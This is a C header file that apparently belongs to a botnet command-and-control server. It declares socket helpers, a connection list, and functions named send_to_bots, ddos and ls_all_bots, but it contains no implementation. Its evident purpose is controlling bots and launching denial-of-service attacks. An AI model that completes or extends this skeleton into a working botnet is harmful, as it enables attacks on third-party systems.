#ifndef HANDLE_ME

#define HANDLE_ME


#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/socket.h>    //for socket ofcourse
#include <errno.h> //For errno - the error number
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>

#define ERROR -1

int make_socket(void);
void *accept_handler(void);
void send_to_bots(char *data);
void bind_socket(struct sockaddr_in *serverAddr);
typedef struct connections
{
	int sock;
	struct sockaddr_in client_conn;
	struct connections *next;
} CONNS;

void start();
void init();
void close_all();
void sig_handler(int signo);
int hostname_to_ip(char * hostname , char* ip);
void ddos();
void ls_all_bots();
int main(int argc, char const *argv[]);

#endif